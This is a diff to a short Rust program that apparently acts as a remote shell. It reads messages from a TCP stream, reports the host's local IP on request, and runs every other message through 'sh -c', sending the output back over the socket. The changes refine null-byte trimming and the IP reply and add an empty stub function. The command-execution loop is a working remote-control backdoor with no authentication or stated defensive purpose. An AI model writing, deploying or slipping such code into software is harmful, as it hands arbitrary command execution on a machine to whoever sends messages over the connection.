@@ -10,24 +10,26 @@ fn main() {
     while i < 15{
         let mut buffer = [0;1024]; //set the buffer
         stream.read(&mut buffer).unwrap(); //read the buffer
-        let recv = std::str::from_utf8(&buffer).unwrap(); //string of recv
+        let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
         println!("Received: {}",&recv); //print that shit
-        if recv == "getIP" { //if it's getIP, return the IP
-            let localIP = local_ip().unwrap();
-            stream.write(&localIP.as_bytes()).unwrap(); //send it
-            println!("Sent: {}",&localIP); //print it
+            if recv.contains("getIP") { //if it's getIP, return the IP
+                let localIP = local_ip().unwrap(); //get the local IP
+                println!("Sent: {}",&localIP); //print it
+                let localIP = format!("{}",&localIP);
+                let localIP = localIP.as_bytes();
+                stream.write(&localIP).unwrap(); //send it
         } else {
             println!("Out: {}",&recv);
-            // stream.write(&out.as_bytes()).unwrap();
-            // println!("Sent: {}",&out);
-            let mut output = Command::new("sh").arg("-c").arg(&recv.trim_matches(char::from(0))).output().expect("execution failed from the client"); //run this
+            let output = Command::new("sh").arg("-c").arg(&recv).output().expect("execution failed from the client"); //run this
             let stderrout = format!("{}{}",String::from_utf8_lossy(&output.stdout),String::from_utf8_lossy(&output.stderr));
-            // println!("stdout: {}", String::from_utf8_lossy(&output.stdout)); //print stdout
-            // println!("stderr: {}", String::from_utf8_lossy(&output.stderr)); //print stderr
             println!("Output: {}",stderrout);
             stream.write(&stderrout.as_bytes()).unwrap(); //send that shit
         };
         i+=1;
     }
     stream.shutdown(Shutdown::Both).expect("shutdown call failed");
+}
+
+fn sendCommand(cmd: &str, stream: &TcpStream){
+    true;
 }
